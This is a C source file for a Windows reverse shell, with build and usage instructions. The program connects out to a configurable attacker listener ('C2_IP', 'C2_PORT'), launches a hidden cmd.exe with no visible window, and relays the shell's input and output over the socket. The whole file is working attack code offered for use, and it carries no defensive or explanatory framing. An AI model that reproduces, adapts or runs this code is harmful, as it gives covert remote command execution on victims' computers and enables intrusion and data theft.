/*
 * Windows Reverse Shell
 *
 * Connects outbound to an attacker-controlled listener, spawns
 * a hidden cmd.exe, and relays its I/O through the socket using
 * anonymous pipes.
 *
 * Build:  x86_64-w64-mingw32-gcc rshell.c -o rshell.exe -lws2_32
 * Usage:  On the listener:  nc -lvnp <port>
 *         On the target:    rshell.exe
 *
 * Modify C2_IP and C2_PORT below to match your listener.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

/* Listener configuration — set these before compiling */
#define C2_IP   "127.0.0.1"
#define C2_PORT 4444

#define RELAY_BUFFER_SIZE 4096

static SOCKET g_sock = INVALID_SOCKET;

/*
 * Relay thread: reads data from cmd.exe's stdout pipe
 * and forwards it to the socket (output toward attacker).
 */
static DWORD WINAPI PipeToSocket(LPVOID param) {
    HANDLE hPipeRead = (HANDLE)param;
    char buf[RELAY_BUFFER_SIZE];
    DWORD bytesRead;

    while (ReadFile(hPipeRead, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0) {
        send(g_sock, buf, bytesRead, 0);
    }
    return 0;
}

/*
 * Relay thread: reads data from the socket and writes it
 * to cmd.exe's stdin pipe (commands from attacker).
 */
static DWORD WINAPI SocketToPipe(LPVOID param) {
    HANDLE hPipeWrite = (HANDLE)param;
    char buf[RELAY_BUFFER_SIZE];
    DWORD bytesWritten;

    while (1) {
        int bytesRecv = recv(g_sock, buf, sizeof(buf), 0);
        if (bytesRecv <= 0) break;
        WriteFile(hPipeWrite, buf, bytesRecv, &bytesWritten, NULL);
    }
    return 0;
}

int main(void) {
    /* Winsock initialization — required on Windows before any socket call */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    /* Create socket and connect to C2 */
    g_sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                        NULL, 0, WSA_FLAG_OVERLAPPED);
    if (g_sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &target.sin_addr);

    if (connect(g_sock, (struct sockaddr *)&target, sizeof(target)) == SOCKET_ERROR) {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    /* Create two anonymous pipes:
     *   Pipe 1: for cmd.exe's stdin  (data flows attacker -> cmd)
     *   Pipe 2: for cmd.exe's stdout (data flows cmd -> attacker)
     */
    HANDLE hStdinRead, hStdinWrite;
    HANDLE hStdoutRead, hStdoutWrite;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0) ||
        !CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    /* Prevent cmd.exe from inheriting the pipe ends we keep for ourselves */
    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);

    /* Launch cmd.exe with redirected I/O and no visible window */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError  = hStdoutWrite;

    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(g_sock);
        WSACleanup();
        return 1;
    }

    /* Close the pipe ends we don't need — cmd.exe has its own copies now */
    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);

    /* Start relay threads for bidirectional communication */
    HANDLE hThread1 = CreateThread(NULL, 0, PipeToSocket, hStdoutRead, 0, NULL);
    HANDLE hThread2 = CreateThread(NULL, 0, SocketToPipe, hStdinWrite, 0, NULL);

    /* Block until cmd.exe terminates */
    WaitForSingleObject(pi.hProcess, INFINITE);

    /* Cleanup */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRead);
    CloseHandle(hStdinWrite);
    CloseHandle(hThread1);
    CloseHandle(hThread2);
    closesocket(g_sock);
    WSACleanup();
    return 0;
}
